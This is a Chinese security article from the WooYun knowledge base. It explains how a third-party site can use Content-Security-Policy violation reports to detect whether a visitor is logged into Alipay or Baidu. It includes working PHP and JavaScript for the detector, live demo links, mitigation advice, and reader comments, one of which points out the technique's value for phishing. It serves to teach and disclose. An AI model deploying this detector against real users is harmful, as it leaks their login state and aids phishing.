@@ -1,0 +1,51 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">利用CSP探测网站登陆状态（alipay/baidu为例）</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">phith0n</a> <span class="bull">·</span> <time title="2015/01/04 14:54" ui-time="" datetime="2015/01/04 14:54" class="published ng-binding ng-isolate-scope">2015/01/04 14:54</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 背景</h1><hr><p>今天看到zone里有同学发帖说了探测支付宝登录状态的帖子：http://zone.wooyun.org/content/17665</p><p>由此我想到了我们parsec的@/fd 半年前提到的一个思路，当时他给出了一个探测twitter是否登录的页面，可是我那个时候才疏学浅，好像一直没理解。这时候返回去看看，就有了这篇文章。</p><h1>0x01 CSP简介</h1><hr><p>内容安全策略（Content Security Policy，简称CSP）是一种以可信白名单作机制，来限制网站中是否可以包含某来源内容。默认配置下不允许执行内联代码 <code>&lt;script&gt;</code> 块内容，内联事件，内联样式 ，以及禁止执行eval() , newFunction() , setTimeout([string], …) 和setInterval([string], …) 。</p><p></p><p>CSP更详尽的介绍可以在drops看到：http://drops.wooyun.org/tips/1439</p><h1>0x02 大环境介绍与原理</h1><hr><p>简单了解一下CSP，我们知道CSP可以限制网站中可否包含某来源的内容。同时，csp还可以在页面违反规则的时候发送一个数据包，将具体细节通知给服务端。</p><p>我们再来想想像支付宝这种集成度很高的网站服务，当我们在未登录的情况下访问alipay的某个子域名（如test.alipay.com），很可能是会302跳转到一个用户登陆专用的域名（如login.alipay.com）下要求用户登录。而在已登录的情况下是不会跳转的。</p><p>这就造成了一个登录/未登录的一个差别，主要差别如下：</p><ol><li><p>HTTP状态码（302和200）</p></li><li><p>最终访问的域名（test.alipay.com和login.alipay.com）</p></li></ol><p>因为浏览器SOP（同源策略）的限制，正常情况下我们是无法获取到alipay域名下HTTP状态码的。</p><p>但结合CSP安全策略，我们却可以简单获得第2个，也就是最终访问域名。为什么？</p><p>我前面说了CSP是可以限制页面中允许加载哪些来源的内容的。所以，当我们将CSP设置为只接受来源为test.alipay.com的内容，那么当加载来源为login.alipay.com的请求时就会被CSP策略拒绝，并可以将这个访问report给服务端，我们通过report的内容就能判断用户访问的是test还是login。 过程如下：</p><p><img alt="enter image description here" img-src="c901fc20bae9e6f9f22e65b89bf5d253e042f553.jpg"></p><p>这就是原理，很赞的一个思路，再次崇拜一次@/fd。</p><h1>0x03 以支付宝为例编写探测代码</h1><hr><p>所以，根据上面的思路，我们第一步就是找到一个这样的页面：登录、未登录用户访问时到达的“域名”不相同。这里的“域名”包括protocol和hostname，也就是说http://test.alipay.com和https://test.alipay.com是不同的域名。</p><p>像支付宝这种网站有很多这样的页面，因为支付宝的很多服务是登录用户才能查看的，而登录入口又只有那么一个。</p><p>比如这个URL：https://my.alipay.com/portal/i.htm，当未登录用户访问的时候会跳转到https://auth.alipay.com/login/index.htm，已登录用户访问时不会跳转。</p><p>这时候我们将CSP的img-src限制为https://my.alipay.com，再将https://my.alipay.com/portal/i.htm作为img的src，这个时候就会出现一个有趣的现象：未登录的用户访问时，会触发CSP规则。</p><p>因为未登录的用户访问时实际img加载的src是https://auth.alipay.com/login/index.htm，不符合CSP限制的img-src，自然就触发规则了。 这时候我们在设置CSP的report-uri为report.php，不符合规则的请求会被记录下作为日志发送到report.php里：</p><p><img alt="enter image description here" img-src="c6a4fa0607387ec5d8c79387b47f14e06fad64cd.jpg"></p><p>不过浏览器在发送这个report包的时候是不带cookie的，所以服务器那边并不能直接判断是哪个用户发送的report包，所以我们在report的GET参数里带上用户的session id。</p><p>示例代码如下：</p><pre><code>#!php
+&lt;?php
+session_start();
+$ssid = session_id();
+header("Content-Security-Policy:img-src https://my.alipay.com; report-uri report.php?ssid={$ssid}");
+?&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset="utf-8" /&gt;
+&lt;title&gt;支付宝登陆检测&lt;/title&gt;
+&lt;/head&gt;
+&lt;body onload="return check();"&gt;
+&lt;img src="https://my.alipay.com/portal/i.htm"&gt;
+&lt;b id="result"&gt;&lt;/b&gt;
+&lt;script type="text/javascript"&gt;
+function check()
+{
+    with(new XMLHttpRequest) {
+        open('GET', 'alipay.php');
+        send();
+        onreadystatechange = function() {
+            if (readyState ^ 4) return;
+            result.innerHTML = parseInt(responseText) &gt; 0 ? '未登录' : '已登录';
+        }
+    }
+}
+&lt;/script&gt;
+&lt;/body&gt;
+</code></pre><p>report.php用来记录：</p><pre><code>#!php
+&lt;?php
+session_start();
+if (preg_match('/^[a-z0-9]*$/i', $_GET['ssid'])) {
+    session_id($_GET['ssid']);
+}else{
+    exit;
+}
+$report = file_get_contents("php://input");
+if (!empty($report)) {
+    $_SESSION['nologin'] = 1;
+}else{
+    $_SESSION['nologin'] = 0;
+}
+?&gt;
+</code></pre><p>当接收到php://input的时候说明CSP发送报告了，说明请求违反的CSP规则了，也就意味着用户没有登录，所以将session中的nologin设置为1。 然后在index.php里用一个ajax来向alipay.php请求，实际上就是获得$_SESSION[nologin]的值：</p><pre><code>#!php
+&lt;?php
+session_start();
+echo isset($_SESSION['nologin']) ? $_SESSION['nologin'] : 0;
+setcookie('PHPSESSID', '', time() - 10);
+session_destroy();
+?&gt;
+</code></pre><p>如上，获取完后将session清除一下，以免影响下一次的判断。</p><p>获得值如果为1的话，说明没有登录，如果为0说明已登录，就可以显示出来或做任何其他操作了。</p><p>来个演示：http://mhz.pw/game/detect/alipay/</p><p>登录支付宝以后访问，显示“已登录”</p><p><img alt="enter image description here" img-src="85e67e0bcb55220bb51f94770d93c9a6a6281c03.jpg"></p><p>换个浏览器，直接访问则显示“未登录”：</p><p><img alt="enter image description here" img-src="faa6056c2b16b034cee3e2c52f2775572c597fd7.jpg"></p><h1>0x04 由http/https混用造成的问题（百度为例）</h1><hr><p>同样的问题，不仅仅是支付宝存在，只要有“统一登录入口”的网站都可能出现这个问题，因为统一登录入口通常是一个单独的域名。</p><p>还有一种情况，是http和https混用造成的。有些网站的登录页面是https加密传输的，但登陆以后实际的操作页面是走http。</p><p>这之间一样存在一个跳转的问题，当我们访问一个登陆后才能看到的页面如http://xxx.com/index，未登录的用户就会跳转到登录页面，如https://xxx.com/login。</p><p>在CSP里http和https是完全不同的两个来源，所以也能触发CSP规则。</p><p>比如https://passport.baidu.com，这是百度的安全中心。当已登录用户访问的时候会跳转到“安全中心”首页http://passport.baidu.com/center（注意，此处是http）：</p><p><img alt="enter image description here" img-src="f281fb0b81f023bc01ad8764b6023a30fded5e11.jpg"></p><p>而未登录用户访问则会跳转到https://passport.baidu.com/v2/?login（这时候是https）：</p><p><img alt="enter image description here" img-src="560f2629c5f61a465dfd41e3f1bcaf8bac8d01cb.jpg"></p><p>虽然两个域名都是passport.baidu.com，但因为protocol不同，混用的http和https就能够影响CSP的拦截情况。</p><p>我们将CSP设置为img-src https://passport.baidu.com ，那么img的src就只接受来源为https://passport.baidu.com的img，那么已登录用户访问的http://passport.baidu.com/center就会被阻止，产生一个CSP报告。记录下这个报告，一样能判断访客是否已登录百度。</p><p>测试你是否登录百度：http://mhz.pw/game/detect/baidu/</p><h1>0x05 影响及防范方法</h1><hr><p>严格来论，只是判断用户是否登录，这个问题并不算一个漏洞。当时@/fd将问题提交到推特之后推特的回应也是不算漏洞，但确实如果与其他一些漏洞结合使用，会让某些漏洞的成功率提高一大截。所以我们可以将之归为一个“奇技淫巧”。</p><p>这个问题更容易出现在一些大型网站、企业网络之中，往往这些网站的统一性和重用性都做的很好，所以往往登录入口只有一个（现在流行一个user center的概念），所以难免会出现一些跳转的问题。有这些跳转，就是探测用户登录的基础。</p><p>这个方法还有一个限制，就是用户使用的浏览器需要是现代浏览器，需要支持CSP安全策略。如果你要探测的用户还在用IE6~IE10，那么是肯定不行的。 如何解决这个问题？如果你真的觉得这是个安全问题的话，那么尽量避免跳转，或者使用javascript进行页面的跳转。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/2016012414014966dd256dd9219030aec2a4c8fbe00433.jpg" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">jeary</span> <span class="reply-time">2015-07-22 10:08:25</span></div><p></p><p>用josnp接口更方便~~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">麻辣烫</span> <span class="reply-time">2015-03-10 13:56:56</span></div><p></p><p>怎麼感覺沒這麼複雜呢。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Forever80s</span> <span class="reply-time">2015-01-06 11:55:53</span></div><p></p><p>IE不支持的东西</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Matt</span> <span class="reply-time">2015-01-05 16:28:11</span></div><p></p><p>我来赞你一下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Levine</span> <span class="reply-time">2015-01-05 16:17:40</span></div><p></p><p>好久没看到干货了!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Sogili</span> <span class="reply-time">2015-01-04 22:36:47</span></div><p></p><p>危害不大，但应该是一个长期可以利用的手段。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">专注XSS三十年</span> <span class="reply-time">2015-01-04 18:42:53</span></div><p></p><p>最简单的应用，钓鱼。具有登录状态判断的功能是每个钓鱼页面梦寐以求的。特别是现在智能设备的流行，手机和平板上默认是不显示地址的，也就是说无法直观的一眼从域名中看出是否钓鱼页面，这时页面内容的可信性就占了主导地位。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mramydnei</span> <span class="reply-time">2015-01-04 18:29:22</span></div><p></p><p>这个可以归纳到信息收集吧。</p><p>就和扫描端口一样，开放了某端口意味着多了一个方向，但是开放了80端口证明不了一定就有web容器在运行。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2015-01-04 16:59:44</span></div><p></p><p>脑洞不够大，想不到怎么利用……</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sky</span> <span class="reply-time">2015-01-04 16:24:03</span></div><p></p><p>顶</p><p></p></div></div></div></div></div></main>
